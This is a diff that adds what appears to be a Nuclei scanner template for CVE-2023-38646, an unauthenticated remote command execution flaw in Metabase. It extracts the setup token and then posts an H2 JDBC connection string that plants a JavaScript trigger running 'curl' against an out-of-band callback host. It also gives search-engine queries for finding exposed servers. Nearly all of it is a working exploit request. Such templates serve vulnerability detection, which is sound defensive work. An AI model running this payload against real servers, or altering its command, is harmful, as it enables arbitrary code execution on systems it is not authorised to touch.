@@ -1,0 +1,73 @@
+id: Metabase-validate
+
+info:
+  name: Metabase validate remote command execution vulnerability CVE-2023-38646
+  author: Zero Trust Security Attack and Defense Laboratory
+  severity: high
+  description: |
+    Metabase is an open source data analysis and visualization tool that helps users easily connect to various data sources, including databases, cloud services, and APIs, and then use an intuitive interface for data query, analysis, and visualization. Unauthenticated remote attackers can exploit this vulnerability to execute arbitrary commands on the server with the privileges of running the Metabase server
+  metadata:
+    fofa-query: app="Metabase"
+    hunter-query: app.name="Metabase"
+
+
+
+http:
+  - raw:
+      - |
+          GET /api/session/properties HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
+          Content-Type: application/json
+      - |
+          POST /api/setup/validate HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/json
+          Content-Length: 812
+
+          {
+              "token": "{{token}}",
+              "details":
+              {
+                  "is_on_demand": false,
+                  "is_full_sync": false,
+                  "is_sample": false,
+                  "cache_ttl": null,
+                  "refingerprint": false,
+                  "auto_run_queries": true,
+                  "schedules":
+                  {},
+                  "details":
+                  {
+                      "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl {{interactsh-url}}')\n$$--=x",
+                      "advanced-options": false,
+                      "ssl": true
+                  },
+                  "name": "an-sec-research-team",
+                  "engine": "h2"
+              }
+          }
+
+    extractors:
+      - type: regex
+        name: token
+        part: body_1
+        group: 1
+        regex:
+          - '"setup-token":"(.*?)"'
+        internal: true
+
+    attack: clusterbomb
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
